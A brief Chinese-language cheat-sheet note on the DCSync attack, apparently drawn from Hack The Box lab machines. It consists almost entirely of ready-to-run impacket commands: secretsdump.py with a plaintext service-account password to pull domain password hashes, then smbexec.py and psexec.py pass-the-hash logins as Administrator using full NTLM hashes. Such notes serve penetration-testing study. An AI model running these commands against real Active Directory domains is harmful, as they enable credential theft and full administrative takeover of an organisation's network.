# DCSync

模拟域控向其他域控请求数据同步。

```shell
python3.10 secretsdump.py  'egotistical-bank/svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175' -just-dc
```



拿到Administrator的NTLM hash后连接即可：

```shell
python3.10 smbexec.py egotistical.local/Administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
```

或者psexec.py：

```shell
python3.10 psexec.py htb.local/Administrator@10.10.10.103 -hashes aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267
```

